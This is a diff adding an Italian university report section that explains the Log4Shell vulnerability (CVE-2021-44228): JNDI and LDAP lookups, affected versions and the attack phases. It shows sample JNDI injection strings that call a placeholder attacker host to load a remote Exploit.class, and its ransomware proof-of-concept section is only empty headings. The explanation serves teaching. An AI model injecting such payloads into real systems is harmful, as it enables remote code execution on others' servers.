@@ -12,6 +12,7 @@
 \usepackage{graphicx}              
 \usepackage{pdfpages}             
 \usepackage{afterpage}
+\usepackage[hidelinks]{hyperref}
 
 \usepackage{xcolor}
 \definecolor{codegreen}{rgb}{0,0.6,0}
@@ -62,8 +63,8 @@
         \large
         
         \emph{Studenti:}\\[1mm]
-        Cristiano Di Bari  - VR476576\\[1mm]
-        Matteo Cavaliere - VR477235\\[2cm]
+        Cristiano Di Bari  - VR476576  \\[1mm]
+        Matteo Cavaliere - VR477235  \\[2cm]
 
         {\large A.A. 2021-2022}
     \end{center}
@@ -71,6 +72,127 @@
 
 \tableofcontents
 \newpage
+
+%% LOG4SHELL %%
+\section{La vulnerabilità Log4Shell}
+Il 9 dicembre 2021 è stata resa nota pubblicamente una vulnerabità che affligge la libreria di logging \emph{\href{https://logging.apache.org/log4j/2.x/}{Apache Log4j}}, utilizzata per gestire le operazioni di logging in moltissime applicazioni Java.
+La vulnerabilità, subito rinominata \emph{Log4Shell}, è stata segnalata come critica data la larga scala su cui impatta, le conseguenze che può provocare e la sua facilità di sfruttamento.
+Lo zero-day, inizialmente annunciato con un tweet insieme ad un PoC pubblicato su github è stato ora pubblicato come \textbf{\href{https://nvd.nist.gov/vuln/detail/CVE-2021-44228}{CVE-2021-44228}}  una vulnerabilità di tipo Remote Code Execution (RCE) classificato 10 su 10 in termini di gravità. Infatti tramite il log di una determinata stringa, un cybercriminale ha la possibilità di eseguire codice arbitrario e, potenzialmente, ottenere il controllo totale del sistema su cui viene eseguita l'applicazione.
+
+
+\subsection{JNDI Injection}
+
+Nel 2013 il team di sviluppo di Log4j ha aggiunto un plugin chiamato \textbf{JNDI-Lookup} alla libreria di logging. Per capire come questa modifica abbia portato alla recente vulnerabilità, è necessario introdurre il concetto di \emph{Java Naming and Directory Interface} (\textbf{JNDI}).
+
+\subsubsection{JNDI}
+
+JNDI fornisce un'API Java che consente alle applicazioni di interagire con oggetti remoti memorizzati attraverso servizi di naming e directory.
+Esso dispone di una serie di SPI (\emph{Service Provider Interface}) che permettono di utilizzare una varietà di servizi di directory.
+Tramite questa interfaccia i client Java possono scoprire e ottenere dati e oggetti attraverso un nome. 
+
+JNDI supporta due protocolli principali: RMI e LDAP, in entrambi i casi una chiamata lookup ha lo scopo di restituire un oggetto Java. Questi oggetti sono solitamente serializzati, tuttavia esiste anche un meccanismo di riferimento JNDI per la costruzione indiretta di un oggetto tramite una factory.
+I bytecode di questi oggetti (o delle factory) possono essere caricati tramite l'URL di una codebase remota (cioè un server web contenente file \verb!.class!). Un'applicazione Java può ad esempio utilizzare il protocollo LDAP tramite JNDI per trovare un oggetto remoto contenente i dati di cui potrebbe aver bisogno.
+
+\subsubsection{LDAP attack vector}
+\emph{Lightweight Directory Access Protocol} (LDAP) è un protocollo standard per l'interrogazione e la modifica dei servizi di directory.
+Le informazioni all’interno di un server LDAP sono organizzate in modo gerarchico in elementi chiamati entry che vengono identificati in modo univoco mediante il \emph{Distinguished Name} (DN) così come un file viene identificato nel file system mediante il proprio path. Ciascuna entry viene associata ad una o più classi di oggetti che definiscono la struttura che questa deve assumere, attributi opzionali e obbligatori e tipologia di informazioni contenute.
+
+Il client inizia una sessione LDAP collegandosi ad un server LDAP, comunemente in ascolto su due porte TCP, una per la connessione in chiaro (porta 389) ed una la connessione cifrata (porta 636)
+Esiste un formato per una URL che identifica un'operazione LDAP e che solitamente viene utilizzato per effettuare ricerche o per consentire al server di restituire dei \emph{referrals} cioè riferimenti ad un altro server che contiene le informazioni richieste dal client.
+\begin{center}
+    \verb!ldap://host:port/DN?attributes?scope?filter?extensions!
+\end{center}
+
+Ad esempio, il seguente URL: \verb!ldap://localhost:389/o=ObjectID! può essere usato per trovare e richiamare \verb!Object! da un server LDAP remoto in esecuzione sulla stessa macchina (localhost) o su una macchina collegata in rete ospitata in un ambiente controllato.
+Tuttavia, il servizio LDAP potrebbe essere in esecuzione su un server diverso, potenzialmente in qualsiasi punto di Internet. Tale flessibilità implica che un utente malintenzionato con la capacità di controllare l'URL LDAP, sarebbe in grado di condurre un programma Java ad istanziare una classe da un server LDAP sotto il suo controllo. 
+Questo significa che un'attaccante che può controllare l'URL JNDI, può far sì che l'applicazione carichi ed esegua codice Java arbitrario.
+
+
+\subsubsection{JNDI in Log4j}
+
+Log4Shell è fondamentalmente una vulnerabilità di JNDI Injection abbastanza semplice, triggerata tramite la ricerca JNDI, chiamata JNDI Lookup, implementata nella libreria di logging, che consente di recuperare variabili remote tramite JNDI.
+
+Log4J effettua una JNDI lookup mentre espande i placeholder nei messaggi di log. Quasi tutti gli input dell'utente, prima di essre loggati, vengono interpretati dal logger, questo consente all'attaccante che può manipolare l'input, di caricare dati da un server JNDI dannoso e potenzialmente eseguire codice Java arbitrario.
+Log4j2 supporta la possibilità di specificare dei placeholder nei messaggi di log come riferimenti a proprietà definite altrove. Questo viene effettuato attraverso una sintassi speciale nella forma \verb!${prefisso:nome}!, dove il prefisso identifica un contesto specifico nel quale valutare il nome della variabile.
+Ad esempio loggando la stringa \verb!${java:version}! si ottiene la versione corrente di Java in esecuzione.
+
+
+Tutto ciò che un attaccante deve fare per sfruttare la vulnerabilità è trovare un input che viene registrato nei log ed iniettare una stringa del tipo:
+\begin{center}
+    \verb!${jndi:ldap://attackerserver.com.com/x}!
+\end{center}
+Questo potrebbe essere un'intestazione HTTP come lo User-Agent (comunemente registrato nei log) o un parametro di un form come username o password che viene loggato dalla applicazione.
+
+
+\subsubsection{Patch nelle versioni Java}
+
+Per diverso tempo sia per RMI che per LDAP il riferimento che era possibile specificare relativo alla codebase da importare non è stato affatto limitato, una chiamata lookup ad server LDAP o RMI controllato dall'attaccante portava direttamente all'esecuzione di codice remoto.
+
+A partire dalla versione di Java \verb!8u121! l'inserimento di una codebase remota è stata bloccata di default per quanto riguarda RMI.
+Apparentemente la patch era stata applicata anche per LDAP, ma si è rivelata completamente inefficace per il caricamento di oggetti tramite le codbase di factory. Pertanto, fino al rilascio di Java \verb!8u191! (circa tre anni fa) i riferimenti LDAP consentivano di caricare classi remote contenenti codice arbitrario tramite una chiamata JNDI lookup controllata.
+
+Le versioni JDK successive a \verb!8u191! non sono vulnerabili al vettore di attacco LDAP. In queste versioni \verb!com.sun.jndi.ldap.object.trustURLCodebase! è impostato su \verb!false! per impostazione predefinita, il che significa che JNDI non può caricare codice remoto utilizzando LDAP. Tuttavia, esistono altri vettori di attacco capaci di causare RCE, un attaccante infatti potrebbe comunque sfruttare il codice di altre applicazioni esistenti sul server per ottenere il caricamento di codice remoto. 
+
+
+
+\subsection{Requisiti dell'attacco}
+Tantissimi servizi sono vulnerabili a questo exploit, servizi in cloud come Minecraft, Steam ma anche applicazioni desktop.
+Qualsiasi software Java utilizzi la famosa libreria di Apache potrebbe essere esposto ad attacchi che sfruttano la vulnerablità.
+
+I requisiti per considerare un sistema una potenziale vittima di questo tipo di attacchi sono:
+\begin{itemize}
+    \item Un server con una versione di Apache log4j compresa fra la \verb!2.0-beta9! e la \verb!2.14.1!.
+    
+    \item Un endpoint in ascolto su qualsiasi protocollo (HTTP, TCP, \dots) che permetta all'attaccante di inviare il payload malevolo
+    
+    \item Un'istruzione che effettui il log tramite log4j della stringa ricevuta.
+\end{itemize}
+
+
+
+\subsection{Fasi dell'attacco}
+Un'attacco che sfrutta la vulnerabilità Log4Shell con il vettore LDAP per ottenere una RCE si struttura in 4 fasi principali:
+
+\begin{enumerate}
+    \item L'attaccante attraverso una richiesta attuata con qualsiasi portocollo (HTTP, TCP, \dots) invia al server target il payload malevolo con l'URL JNDI:
+    \begin{center}
+        \verb!${jndi:ldap://attackerserver.com:1389/Exploit}!
+    \end{center}
+    all'inerno di un campo testuale che verrà successivamente loggato dalla applicazione con Log4j. 
+    
+    \item Il logger parserizza il payload ed effettua una richiesta tramite JNDI al server \verb!attackerserver.com!, controllato dall'attaccante, alla ricerca dell'oggetto \verb!Exploit!.
+    
+    \item Il sever LDAP dell'attaccante risponde fornendo il path di un file Java compilato (\verb!http://attackerserver.com/Exploit.class!) contenuto in un secondo server malevolo remoto.
+    
+    \item A questo punto l'applicazione vulnerabile carica il file remoto \verb!Exploit.class!, instanziando l'oggetto Java ed eseguendo il codice del suo costruttore. Tale operazione consente all'attaccante di ottenere i privilegi di esecuzione di codice remoto sull'host.
+\end{enumerate}
+
+
+%% POC %%
+\section{PoC: Attacco Ramsonware tramite Log4Shell}
+
+\subsection{Cyber Kill Chain dell'attacco}
+\subsubsection{Reconnaissance}
+
+\subsubsection{Weaponization}
+
+\subsubsection{Deliver}
+
+\subsubsection{Exploitation}
+
+\subsubsection{Installation}
+
+\subsubsection{Command and Control}
+
+\subsubsection{Actions on Objectives}
+
+\section{Conclusioni}
+
+%% BIBLIOGRAFIA %%
+\addcontentsline{toc}{section}{\bibname}
+\bibliographystyle{plain}
+\nocite{*}
+\bibliography{bibliography}
 
 
 \end{document}
